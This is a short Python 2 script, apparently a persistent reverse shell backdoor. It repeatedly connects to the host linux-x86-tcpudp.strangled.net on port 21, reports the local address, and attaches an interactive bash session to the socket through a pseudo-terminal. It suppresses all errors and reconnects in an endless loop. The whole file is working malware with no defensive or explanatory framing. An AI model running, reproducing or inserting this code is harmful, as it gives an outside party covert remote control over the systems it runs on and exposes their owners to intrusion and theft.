import socket, os, pty, select, subprocess, time

while 1:
    try:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("linux-x86-tcpudp.strangled.net", 21))

            try: local_ip = s.getsockname()
            except: local_ip = "Legacy"

            s.sendall(str(local_ip) + "\n")

            master, slave = os.openpty()
            p = subprocess.Popen(["/bin/bash", "-i"], stdin=slave, stdout=slave, stderr=slave, preexec_fn=os.setsid)
            os.close(slave)

            while p.poll() is None:
                r, _, _ = select.select([s, master], [], [], 5)
                if not r:
                    try:
                        s.sendall("\x00")
                    except:
                        break
                    continue
                for fd in r:
                    if fd == s:
                        d = s.recv(4096)
                        if not d: break
                        os.write(master, d)
                    elif fd == master:
                        d = os.read(master, 4096)
                        if not d: break
                        s.sendall(d)
                else:
                    continue
                break

            try: p.terminate()
            except: pass

        except Exception, e:
            pass

    finally:
        try: s.close()
        except: pass
